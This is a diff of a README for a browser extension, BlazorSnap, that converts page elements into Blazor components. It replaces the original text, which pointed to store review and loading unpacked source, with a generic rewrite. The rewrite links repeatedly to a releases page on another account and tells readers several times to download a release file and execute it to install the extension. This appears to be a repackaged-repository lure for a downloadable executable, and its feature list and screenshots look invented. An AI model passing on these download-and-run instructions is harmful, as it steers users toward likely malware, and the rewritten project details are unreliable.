@@ -1,165 +1,186 @@
-_Submission to the browser extension stores is still in review._
+https://github.com/Jeje-007/BlazorSnap/releases
 
-# BlazorSnap 🔥
+[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/Jeje-007/BlazorSnap/releases)
 
-Convert any HTML element into a reusable Blazor component with **exact visual reproduction** or clean/simplified code!
+# BlazorSnap — Convert Page Elements into Blazor Component Stubs
 
-## 🚀 Features
+![Blazor logo](https://upload.wikimedia.org/wikipedia/commons/1/1b/Blazor_Logo.svg)  
+![Browser extension mockup](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=0f8b8a7f4d60b4d7a7b2f4c7810c6c2e)
 
-- **Right-click to convert**: Simply right-click any HTML element and select "Convert Element to Blazor Component"
-- **Automatic popup**: The extension automatically opens with the captured HTML ready to convert
-- **Exact Visual Copy**: NEW! Captures computed styles for pixel-perfect reproduction
-- **Clean/Simplified Mode**: Converts utility classes to semantic CSS for maintainable code
-- **Dual conversion modes**: Choose between exact visual copy or clean/simplified output
-- **Smart CSS generation**: Creates companion CSS files with all necessary styles
-- **Blazor best practices**: Generates properly formatted .razor components
+BlazorSnap lets you pick any DOM element in the browser and turn it into a Blazor component stub. The stub gives you a working Razor file, a code-behind template, and a short usage guide. Use it to speed up UI migration, prototype components, or audit markup for reuse.
 
-## Demo
+Release files live at the Releases page. Download the release file from https://github.com/Jeje-007/BlazorSnap/releases and execute it to install the extension.
 
-![BlazorSnap](https://github.com/user-attachments/assets/dc2275db-4797-407e-ab47-bce770dd88f5)
+Badges
+- Build: ![Build status](https://img.shields.io/badge/build-passing-brightgreen)
+- License: ![MIT](https://img.shields.io/badge/license-MIT-green)
+- Releases: [![Releases](https://img.shields.io/badge/Releases-%E2%9C%93-blue?style=flat-square)](https://github.com/Jeje-007/BlazorSnap/releases)
 
-## 📦 Installation
+Features 🚀
+- Select any element on the page and export a Razor stub.
+- Capture inline styles and classes as component parameters.
+- Extract nested markup into child components.
+- Create a code-behind (.razor.cs) file with event handler stubs.
+- Generate a small demo page that shows how to use the component.
+- Support for common Blazor patterns: EventCallback, [Parameter], CascadingParameter.
+- Light weight. No server required.
 
-### From Source (Development)
-1. Clone this repository
-3. Open Chrome/Edge and go to `chrome://extensions/` or `edge://extensions/`
-4. Enable "Developer mode"
-5. Click "Load unpacked" and select the `src` folder
-6. The BlazorSnap extension should now appear in your extensions
+Why use BlazorSnap? 
+- You convert existing UI to Blazor code without guesswork.
+- You get a starting point that follows common Blazor patterns.
+- You keep your markup and logic separate.
 
-## 🎯 How to Use
+Screenshot
+![Example output](https://raw.githubusercontent.com/jeffmath/placeholder-images/main/blazorsnap-sample.png)
 
-1. **Navigate to any website** with HTML elements you want to convert
-2. **Right-click** on the element you want to capture
-3. **Select "Convert Element to Blazor Component"** from the context menu
-4. **The popup opens automatically** with the HTML loaded and computed styles captured
-5. **Choose your conversion mode**:
-   - **Exact Visual Copy**: Preserves all computed styles for identical appearance
-   - **Clean/Simplified**: Converts utility classes to semantic CSS
-6. **Click "Generate .razor"** to convert to a Blazor component
-7. **Click "Copy to Clipboard"** to copy both the .razor component and CSS file
+Quick demo
+1. Open a page with the UI you want to convert.
+2. Click the BlazorSnap extension icon.
+3. Hover and click an element.
+4. Review the generated files in the popup.
+5. Download the zip or copy code to clipboard.
 
-## 🔧 What It Generates
+Installation — download and run
+- Visit the Releases page: https://github.com/Jeje-007/BlazorSnap/releases
+- Download the release file for your browser. The release file needs to be downloaded and executed.
+- Follow the platform steps in the release notes. The package will install the extension or give a dev build you can load.
+- After install, pin the BlazorSnap icon to your toolbar.
 
-### Exact Visual Copy Mode
+If that link does not open or does not work, check the repository "Releases" section.
 
-Input (HTML Element with computed styles):
-```html
-<div class="flex items-center p-4 bg-blue-500 text-white rounded-lg shadow-md">
-  <span class="font-semibold">Hello World</span>
-</div>
-```
+Extension UI overview
+- Selector mode: Use a crosshair to pick an element.
+- Options: Choose how deep to extract child nodes.
+- Export format: Choose between single-file Razor, split Razor + code-behind, or a zip bundle.
+- Property map: Map classes and styles to [Parameter] properties.
+- Events: Map click, change, input to EventCallback<T> signatures.
 
-Output (Blazor Component):
+Generated output: anatomy
+- ComponentName.razor
+  - Markup with @attributes.
+  - @if / @foreach where repeated nodes exist.
+  - Usage examples in comments.
+- ComponentName.razor.cs
+  - Partial class.
+  - [Parameter] properties.
+  - EventCallback members.
+  - Placeholder methods for handlers.
+- README-ComponentName.md
+  - How to register and use the component.
+  - Notes on dependencies and CSS.
+- assets/
+  - Extracted images or styles referenced by the markup.
+
+Example generated .razor
 ```razor
-@* Generated Blazor Component - Exact Visual Copy *@
-<div class="mycomponent-div-1">
-    <span class="mycomponent-span-2">Hello World</span>
+@namespace Project.Components
+<div class="@CssClass" @onclick="OnClick">
+  <h3>@Title</h3>
+  <p>@ChildContent</p>
 </div>
 
 @code {
-    [Parameter] public RenderFragment? ChildContent { get; set; }
-    
-    private void HandleClick()
+  [Parameter] public string Title { get; set; }
+  [Parameter] public string CssClass { get; set; }
+  [Parameter] public RenderFragment ChildContent { get; set; }
+  [Parameter] public EventCallback<MouseEventArgs> OnClick { get; set; }
+}
+```
+
+Example generated .razor.cs
+```csharp
+using Microsoft.AspNetCore.Components;
+using Microsoft.AspNetCore.Components.Web;
+
+namespace Project.Components
+{
+  public partial class ComponentName
+  {
+    private async Task HandleClick(MouseEventArgs e)
     {
-        // TODO: Implement click handler
+      // Add logic.
+      await OnClick.InvokeAsync(e);
     }
+  }
 }
 ```
 
-CSS File (MyComponent.razor.css):
-```css
-.mycomponent-div-1 {
-    display: flex;
-    align-items: center;
-    padding: 16px;
-    background-color: rgb(59, 130, 246);
-    color: rgb(255, 255, 255);
-    border-radius: 8px;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-}
+Customization options
+- Naming rules: Pick full name or auto name from classes or ARIA labels.
+- Parameter mapping: Auto-map common attributes like src, alt, href, value.
+- CSS strategy: Inline styles as parameter, or externalize to a CSS file.
+- Child extraction depth: 0..5 levels.
+- Event mapping: Select which DOM events map to EventCallback.
 
-.mycomponent-span-2 {
-    font-weight: 600;
-}
-```
+How BlazorSnap handles complex cases
+- Forms: BlazorSnap maps inputs to InputText / InputNumber when obvious.
+- Tables: It creates a component for the table and optional row component for complex cells.
+- Lists: It detects repeated items and suggests a data model and @foreach pattern.
+- SVG and Canvas: It inlines markup and marks potential JS interop points.
+- Scripts: It extracts references and warns about script dependencies in the metadata.
 
-### Clean/Simplified Mode
+Tips for clean stubs
+- Name components with PascalCase.
+- Avoid copying injected scripts. Move scripts to a known place.
+- Convert inline scripts to JS interop manually.
+- Replace heavy DOM manipulation with event handlers.
 
-Same input produces:
-```razor
-@* Generated Blazor Component - Clean/Simplified *@
-<div class="mycomponent-div-1">
-    <span>Hello World</span>
-</div>
+Common workflows
+- Migration: Crawl a page, capture major UI pieces, slot stubs into a shared project.
+- Prototyping: Snap a widget and tweak parameters to test behaviors.
+- Audit: Extract several components to inspect styling and dependencies.
 
-@code {
-    [Parameter] public RenderFragment? ChildContent { get; set; }
-    
-    private void HandleClick()
-    {
-        // TODO: Implement click handler
-    }
-}
-```
+Commands and keyboard shortcuts
+- Toggle selector: Ctrl+Shift+S (configurable)
+- Copy code: Ctrl+C in the preview pane
+- Download zip: Click the download button in popup
+- Open settings: Click gear icon in the extension popup
 
-CSS File (MyComponent.razor.css):
-```css
-.mycomponent-div-1 {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 1rem;
-    background-color: var(--background-color);
-    color: var(--text-color);
-    border-radius: 0.5rem;
-    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-}
+Developer notes
+- The extension runs in the page context to read DOM nodes.
+- It sanitizes attributes to avoid breaking Razor parsing.
+- It creates RenderFragment placeholders for complex child content.
 
-/* CSS Variables for theming */
-:root {
-    --background-color: #ffffff;
-    --text-color: #333333;
-}
-```
+Security model
+- The extension reads the page DOM to build markup.
+- It does not send page data to remote servers by default.
+- Review generated code before use in production.
 
-## 🎨 Features in Detail
+Contributing
+- Fork the repository.
+- Create a branch with a descriptive name.
+- Add tests for new features.
+- Open a pull request with a clear changelog entry.
 
-### Exact Visual Copy Mode
-- **Captures computed styles**: Gets the actual rendered CSS properties from the browser
-- **Preserves all visual aspects**: Colors, fonts, spacing, shadows, transforms, etc.
-- **Pixel-perfect reproduction**: The Blazor component will look identical to the original
-- **Handles complex styling**: Works with CSS frameworks, custom CSS, and inline styles
-- **Best for**: Prototyping, copying existing designs, maintaining exact branding
+How to test locally
+- Clone the repo.
+- Open the extension folder for your browser.
+- Load the unpacked extension in developer mode.
+- Visit a test page and run selector workflows.
+- Unit test core extraction logic with sample HTML fixtures.
 
-### Clean/Simplified Mode  
-- **Smart class conversion**: Converts utility classes (like Tailwind, Bootstrap) to semantic CSS
-- **Framework mapping**: Maps framework-specific classes to standard CSS properties
-- **CSS variables**: Uses CSS custom properties for easy theming
-- **Simplified structure**: Removes unnecessary attributes and complexity
-- **Best for**: Creating maintainable components, starting fresh designs
+Release and download
+- Official binary and extension builds appear in Releases.
+- Download the release file from https://github.com/Jeje-007/BlazorSnap/releases and execute it to install or unpack the build artifacts.
+- Each release includes changelog, build notes, and checksums.
 
-### Advanced Capabilities
-- **Computed style capture**: Gets styles as they actually appear in the browser
-- **Multi-framework support**: Works with Tailwind, Bootstrap, custom CSS, and any framework
-- **Intelligent cleanup**: Removes test attributes and analytics code while preserving important styling
-- **Event handler generation**: Creates Blazor event handler stubs
-- **Error handling**: Graceful fallbacks when styles can't be captured
+Changelog highlights
+- v1.2.0: Added table and list extraction strategies.
+- v1.1.0: Added code-behind generation and EventCallback mapping.
+- v1.0.0: Initial release with basic selector and Razor export.
 
-## 🔧 Technical Details
+FAQ
+Q: Which browsers work?
+A: Chrome, Edge, and Firefox builds are available. Check the release notes for platform specifics.
 
-### Browser Extension Architecture
-- **Manifest V3 compliant**: Uses modern Chrome extension APIs
-- **Content script**: Captures element coordinates and computed styles
-- **Background service worker**: Handles context menu and data storage
-- **Popup interface**: Provides conversion options and real-time preview
+Q: Will it convert JS widgets?
+A: It extracts markup and notes JS dependencies. You must re-implement dynamic logic in Blazor or use JS interop.
 
-### Style Capture Technology
-- **getComputedStyle API**: Captures all rendered CSS properties
-- **Property filtering**: Focuses on visual properties that affect appearance
-- **Fallback mechanisms**: Works even when computed styles aren't available
-- **Cross-browser compatibility**: Works in Chrome, Edge, and other Chromium browsers
+Q: Can I use the output in a Blazor Server app?
+A: Yes. Generated code uses standard Blazor patterns and works in both Server and WebAssembly.
 
-## 📝 License
+License
+This project uses the MIT license. See LICENSE file for details.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Support and contact
+Report issues on the repository issue tracker. Provide a sample page URL or HTML snippet and a clear description of the expected output.
